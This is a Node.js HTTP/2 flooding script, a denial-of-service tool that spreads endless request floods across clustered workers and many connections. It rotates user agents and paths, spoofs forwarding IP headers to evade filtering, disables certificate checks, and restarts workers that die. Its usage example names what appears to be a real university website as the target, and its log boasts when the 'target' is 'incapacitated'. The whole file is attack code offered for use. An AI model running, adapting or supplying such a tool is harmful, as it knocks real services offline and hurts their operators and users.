#!/usr/bin/env node
/**
 * HTTP/2 NUCLEAR FLOODER - FIXED AND WORKING
 * Usage: node h2flooder_nuclear_fixed.js <target> <connections> <threads>
 * Example: node h2flooder_nuclear_fixed.js https://www.ucv.edu.ph/ 500 8
 */

const http2 = require('http2');
const cluster = require('cluster');
const url = require('url');
const crypto = require('crypto');

// ================= NUCLEAR CONFIG =================
const STATS_INTERVAL = 2000;
const MAX_STREAMS = 9999;
const CONNECTION_TIMEOUT = 10000;
const REQUEST_TIMEOUT = 10000;

// ================= MASSIVE HEADER POOL =================
const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0',
    'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36',
];

const PATHS = [
    '/', '/api/', '/assets/', '/static/', '/images/', '/js/', '/css/',
    '/admin/', '/login/', '/dashboard/', '/profile/', '/settings/',
    '/search', '/data', '/view', '/page', '/post', '/get',
    '/upload', '/download', '/stream', '/video', '/audio',
    '/config', '/system', '/status', '/health', '/metrics', '/debug',
    '/auth', '/oauth', '/callback', '/webhook', '/socket',
    '/api/v1/', '/api/v2/', '/api/v3/',
];

// ================= GLOBAL STATS =================
const stats = {
    active: 0,
    ok: 0,
    fail: 0,
    sent: 0,
    resp: 0,
    goaway: 0,
    rst: 0,
    streams: 0
};

// ================= HELPERS =================
function rand(arr) { return arr[Math.floor(Math.random() * arr.length)]; }

function randomIP() {
    return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
}

function randomString(len) {
    return crypto.randomBytes(len).toString('hex');
}

function randomPath() {
    let path = rand(PATHS);
    if (Math.random() > 0.5) {
        path += '?id=' + randomString(6);
        if (Math.random() > 0.5) {
            path += '&t=' + Date.now();
        }
    }
    return path;
}

function randomHeaders(host) {
    const ip = randomIP();
    return {
        ':method': 'GET',
        ':scheme': 'https',
        ':authority': host,
        ':path': randomPath(),
        'user-agent': rand(USER_AGENTS),
        'accept': rand(['text/html,*/*', 'application/json,*/*', '*/*']),
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': rand(['en-US,en;q=0.9', 'en-GB,en;q=0.9']),
        'cache-control': 'no-cache, no-store, must-revalidate',
        'pragma': 'no-cache',
        'x-forwarded-for': ip,
        'x-real-ip': ip,
        'x-request-id': randomString(16),
        'sec-ch-ua': '"Chromium";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': rand(['"Windows"', '"macOS"', '"Linux"']),
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'upgrade-insecure-requests': '1',
    };
}

// ================= NUCLEAR CONNECTION (FIXED) =================
class NuclearConnection {
    constructor(target, id) {
        this.id = id;
        this.target = target;
        this.session = null;
        this.alive = false;
        this.streamCount = 0;
        this.reconnectDelay = 100;
        this.parseTarget();
        this.connect();
    }

    parseTarget() {
        const parsed = url.parse(this.target);
        this.host = parsed.hostname;
        this.port = parsed.port || 443;
    }

    connect() {
        stats.connecting++;
        
        try {
            this.session = http2.connect(this.target, {
                rejectUnauthorized: false,
                timeout: CONNECTION_TIMEOUT,
                settings: {
                    maxConcurrentStreams: MAX_STREAMS,
                    initialWindowSize: 1048576,
                }
            });

            this.session.on('connect', () => {
                stats.active++;
                stats.connecting--;
                this.alive = true;
                this.reconnectDelay = 100;
                console.log(`[CONN] ${this.id} CONNECTED`);
                // START THE FLOOD IMMEDIATELY
                this.startFlood();
            });

            this.session.on('error', (err) => {
                stats.fail++;
                stats.connecting--;
                this.alive = false;
                this.reconnect();
            });

            this.session.on('close', () => {
                if (this.alive) stats.active--;
                stats.connecting--;
                this.alive = false;
                this.reconnect();
            });

            this.session.on('goaway', (errorCode) => {
                stats.goaway++;
                if (this.alive) stats.active--;
                this.alive = false;
                this.reconnect();
            });

            this.session.on('stream', (stream) => {
                stats.resp++;
                stream.on('data', () => {});
                stream.on('end', () => {});
                stream.on('close', () => { stats.ok++; });
                stream.on('error', () => { stats.fail++; });
            });

        } catch (err) {
            stats.connecting--;
            stats.fail++;
            this.reconnect();
        }
    }

    // ========== FIXED: ACTUAL FLOOD FUNCTION ==========
    startFlood() {
        // Recursive function that keeps firing
        const fire = () => {
            if (!this.alive || !this.session || this.session.destroyed) {
                return;
            }

            // Fire up to 50 requests per tick
            const batchSize = Math.min(50, MAX_STREAMS - this.streamCount);
            
            for (let i = 0; i < batchSize; i++) {
                if (!this.alive || !this.session || this.session.destroyed) {
                    return;
                }

                try {
                    const headers = randomHeaders(this.host);
                    const stream = this.session.request(headers);
                    
                    stats.sent++;
                    stats.streams++;
                    this.streamCount++;

                    stream.setTimeout(REQUEST_TIMEOUT, () => {
                        try { stream.close(); } catch(e) {}
                    });

                    stream.on('response', () => { stats.resp++; });
                    stream.on('error', () => { stats.fail++; });
                    stream.on('close', () => {
                        stats.streams--;
                        this.streamCount--;
                    });

                } catch (err) {
                    stats.fail++;
                    if (err.code === 'ERR_HTTP2_STREAM_ERROR' || 
                        err.code === 'ERR_HTTP2_SESSION_ERROR') {
                        this.alive = false;
                        if (stats.active > 0) stats.active--;
                        this.reconnect();
                        return;
                    }
                }
            }

            // Keep firing indefinitely
            setImmediate(fire);
        };

        // Start the chain reaction with 5 parallel fires
        for (let i = 0; i < 5; i++) {
            setImmediate(fire);
        }
    }

    reconnect() {
        if (this.reconnectDelay > 5000) return;

        setTimeout(() => {
            if (!this.alive) {
                this.reconnectDelay = Math.min(this.reconnectDelay * 1.5, 5000);
                this.connect();
            }
        }, this.reconnectDelay);
    }
}

// ================= NUCLEAR WORKER =================
function startNuclearWorker(target, connectionCount) {
    const connections = [];
    let startTime = Date.now();

    console.log(`[💀 NUCLEAR] pid=${process.pid} conns=${connectionCount} maxStreams=${MAX_STREAMS}`);

    // Create all connections
    for (let i = 0; i < connectionCount; i++) {
        const conn = new NuclearConnection(target, i);
        connections.push(conn);
    }

    // Stats reporting
    setInterval(() => {
        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        const sentPerSec = elapsed > 0 ? Math.floor(stats.sent / elapsed) : 0;
        const respRate = stats.sent > 0 ? Math.round((stats.resp / stats.sent) * 1000) / 10 : 0;
        
        console.log(`[💀 NUCLEAR] active=${stats.active} ok=${stats.ok} fail=${stats.fail} sent=${stats.sent} resp=${stats.resp} goaway=${stats.goaway} rst=${stats.rst} streams=${stats.streams} | ${sentPerSec} req/s | ${respRate}% resp`);
        
        if (stats.sent > 1000000 && stats.resp < 50000) {
            console.log(`[💀 DOMINATION] Server response rate below 5% - target incapacitated`);
        }
    }, STATS_INTERVAL);

    process.on('SIGINT', () => {
        connections.forEach(c => { c.alive = false; if (c.session) c.session.close(); });
        process.exit(0);
    });
}

// ================= MAIN =================
function main() {
    const args = process.argv.slice(2);
    
    if (args.length < 3) {
        console.log(`
╔══════════════════════════════════════════════════════════════╗
║  💀💀💀 HTTP/2 NUCLEAR FLOODER - FIXED 💀💀💀             ║
╠══════════════════════════════════════════════════════════════╣
║  Usage: node h2flooder_nuclear_fixed.js <target> <conns> <threads> ║
║  Example: node h2flooder_nuclear_fixed.js https://target.com/ 500 4 ║
╚══════════════════════════════════════════════════════════════╝
        `);
        process.exit(1);
    }

    const target = args[0];
    const connections = parseInt(args[1]) || 500;
    const threads = parseInt(args[2]) || 4;

    console.log(`\n╔══════════════════════════════════════════════════════════════╗`);
    console.log(`║  💀💀💀 NUCLEAR LAUNCH (FIXED) 💀💀💀                     ║`);
    console.log(`╠══════════════════════════════════════════════════════════════╣`);
    console.log(`║  Target: ${target.padEnd(45)}║`);
    console.log(`║  Connections: ${String(connections * threads).padEnd(30)}║`);
    console.log(`║  Max streams per connection: ${String(MAX_STREAMS).padEnd(20)}║`);
    console.log(`╚══════════════════════════════════════════════════════════════╝\n`);

    if (cluster.isMaster) {
        for (let i = 0; i < threads; i++) {
            const worker = cluster.fork();
            worker.send({ target, connections });
        }

        cluster.on('exit', (worker) => {
            console.log(`[💀 MASTER] Worker died, restarting...`);
            const newWorker = cluster.fork();
            newWorker.send({ target, connections });
        });

        setInterval(() => {
            console.log(`[💀 MASTER] Workers: ${Object.keys(cluster.workers).length} | sent=${stats.sent} streams=${stats.streams}`);
        }, 5000);

    } else {
        process.on('message', (msg) => {
            if (msg.target && msg.connections) {
                startNuclearWorker(msg.target, msg.connections);
            }
        });
    }
}

process.on('SIGINT', () => {
    console.log('\n[💀] Shutting down...');
    process.exit(0);
});

if (require.main === module) {
    main();
}
